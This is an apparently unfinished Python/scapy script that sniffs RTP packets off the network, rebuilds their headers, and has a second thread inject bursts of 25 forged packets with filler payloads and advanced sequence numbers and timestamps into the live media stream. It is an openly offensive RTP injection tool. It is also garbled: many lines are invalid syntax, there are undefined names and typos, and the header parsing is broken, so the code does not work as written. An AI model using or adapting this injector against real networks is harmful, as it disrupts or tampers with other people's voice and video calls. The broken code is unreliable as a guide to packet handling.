import sys
from scapy.all import *
import threading
import copy
import time

def listener():
	printLine = "===================="
	print printLine
	print "Beginning Capture Engine"
	print printLine

	start = timer()*1000

	while True:
		if (timer()*1000) >= start:
			while True:
				global packetSem.acquire()
				packetList = sniff(filter="udp and len>1355", count=1, timeout=.200)
				if not packetList:
					global termSem.acquire()
					global terminate = true
					global termSem.release()
					return
				packet = packetList[0]
				if packet[UDP].len == 1336:
					break

			print "RTP packet captured"
			
			#TODO: Build RTP Layer
			rtpLayer = RTP()/Raw()
			raw = packet[Raw].load

			currByte = ord(raw[0])

			ver = currByte >> 6
			rtpLayer.version = ver

			pad = currByte >> 5
			pad = pad&1
			rtpLayer.padding = pad

			ext = currByte >> 4
			ext = ext&1
			rptLayer = ext

			cc = currByte&15
			rtpLayer.numsync = cc

			currByte = ord(raw[1])

			mark = currByte >> 7
			rtpLayer.marker = mark

			payloadType = currByte&127
			rtpLayer.payload_type = payloadType

			hiByte = ord(raw[2])
			loByte = ord(raw[3])

			hiByte = hiByte << 8
			seq = hiByte + loByte
			rtpLayer.sequence = seq

			hiByte1 = ord(raw[4])
			hiByte2 = ord(raw[5])
			loByte1 = ord(raw[6])
			loByte2 = ord(raw[7])

			hiByte1 = hiByte1 << 24
			hiByte2 = hiByte2 << 16
			loByte1 = loByte1 << 8
			time = hiByte1 + hiByte2 + loByte1 + loByte2
			rtpLayer.timestamp = time

			hiByte1 = ord(raw[8])
			hiByte2 = ord(raw[9])
			loByte1 = ord(raw[10])
			loByte2 = ord(raw[11])

			hiByte1 = hiByte1 << 24
			hiByte2 = hiByte2 << 16
			loByte1 = loByte1 << 8
			ssrc = hiByte1 + hiByte2 + loByte1 + loByte2
			rtpLayer.sourcesync = ssrc

			hiByte1 = ord(raw[12])
			hiByte2 = ord(raw[13])
			loByte1 = ord(raw[14])
			loByte2 = ord(raw[15])

			hiByte1 = hiByte1 << 24
			hiByte2 = hiByte2 << 16
			loByte1 = loByte1 << 8
			sync = hiByte1 + hiByte2 + loByte1 + loByte2
			rtpLayer.sync = sync

			#TODO: Rebuild packet with RTP layer

			newRaw = ""

			for i in range(16, len(raw)):
				newRaw += raw[i]

			rtpLayer[Raw].load = "".join(newRaw)

			packet[Raw] = rtpLayer

			#Send packet to injector
			global passedPacket = packet
			global packetSem.release()
			print "Sending captured RTP packet to injector"
			
			start = (timer()*1000) + 500	
	return


# takes in a packet from the main thread and modifies its seq num and timestamp
def modifyPacketHeader(packet, new_seq, new_ts):
	packet.sequence = new_seq
	packet.timestamp = new_ts

	
# replaces a packet's payload	
def modifyPacketPayload(packet, new_payload):
	packet[Raw].load = new_payload
	
	
def injector():
	# Filler data to replace the packet's payload (20 bytes)
	filler = "AAAAAAAAAAAAAAAAAAAA"
	
	printLine = "===================="
	print printLine
	print "Beginning Injection Engine"
	print printLine
	
	while not global terminate:
		# Attempt to acquire packet
		global packetSem.acquire()
		
		# make sure packet has UDP layer
		# if it does, copy it locally, overwrite the global to be just a tcp layer, and release the semaphore
		if(global passedPacket.hasLayer(UDP):
			packet = copy.deepcopy(global passedPacket)
			global passedPacket = TCP()
			global packetSem.release()
			
			# modify the packet payload
			modifyPacketPayload(packet, filler)

			# introduce 10 ms delay before beginning packet injection
			time.sleep(.01)
			
			# send round of test packets every 20 ms for 500 ms. Roughly 25 packets
			# update sequence number and timestamp accordingly
			print "Beginning sending burst of 25 packets"
			for i in range(0, 25):
				modifyPacketHeader(packet, packet.sequence + 1, packet.timestamp + 20)
				send(packet)
				print "Sending packet %d" % i
				time.sleep(.02)
		else:
			# if it doesn't, release the semaphore and go back to the beginning of the loop
			global packetSem.release()
	return
	

listener = threading.Thread(target = listener)
injector = threading.Thread(target = injector)

packetSem = BoundedSemaphore(value = 1)
termSem = BoundedSemaphore(value = 1)

passedPacket = TCP()
terminate = False

listener.run()
injector.run()

listener.join()
injector.join()

return
